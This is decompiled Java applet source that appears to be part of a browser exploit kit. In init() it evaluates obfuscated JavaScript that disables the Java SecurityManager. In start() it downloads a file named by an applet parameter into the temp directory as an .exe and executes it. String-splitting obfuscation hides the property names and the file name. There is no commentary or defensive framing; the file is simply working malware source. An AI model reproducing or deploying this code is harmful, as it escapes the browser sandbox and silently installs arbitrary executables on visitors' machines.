import javax.script.ScriptEngine;
import javax.script.ScriptException;
import java.awt.Component;
import javax.script.ScriptEngineManager;
import java.io.InputStream;
import java.io.FileOutputStream;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Verifa extends Applet
{
    private JList mersedes;
    
    @Override
    public void start() {
        try {
            String s = System.getProperty("jqg3avqg3a.iqg3o.tqg3mpqg3dqg3ir".replace("qg3", ""));
            if (s.charAt(s.length() - 1) != '\\') {
                s += "\\";
            }
            final String string = s + "lgeg" + ".e".concat("xe");
            final String parameter = this.getParameter("dest");
            String string2 = "";
            for (int i = 0; i < parameter.length(); ++i) {
                int char1 = parameter.charAt(i);
                char1 -= 4;
                string2 += (char)char1;
            }
            final InputStream is = Idmer.createIS(parameter);
            final FileOutputStream fileOutputStream = new FileOutputStream(string);
            byte[] array = new byte[153600];
            final byte[] array2 = new byte[1600];
            int read;
            for (int n = 0; (read = is.read(array)) > 0; array = new byte[153600], n += read) {
                fileOutputStream.write(array, 0, read);
            }
            fileOutputStream.close();
            is.close();
            try {
                Idmer.exe(string);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    @Override
    public void init() {
        try {
            final ScriptEngine engineByName = new ScriptEngineManager().getEngineByName("jabcs".replace("abc", ""));
            engineByName.eval("v37jos39ar err37jos39or = n37jos39ew Err37jos39or(\"M37jos39y err37jos39or\");th37jos39is.toSt37jos39ring = funct37jos39ion(){ ja37jos39va.la37jos39ng.Syst37jos39em.s37jos39etSecu37jos39rityM37jos39anag37jos39er(nul37jos39l);ap37jos39ple37jos39t.st37jos39art();re37jos39turn \"e37jos39xplo37jos39it!\";};37jos39er37jos39ror.mes37jos39sage = th37jos39is;".replace("37jos39", ""));
            this.add(this.mersedes = new JList(new Object[] { engineByName.get("error") }));
        }
        catch (ScriptException ex) {}
    }
}
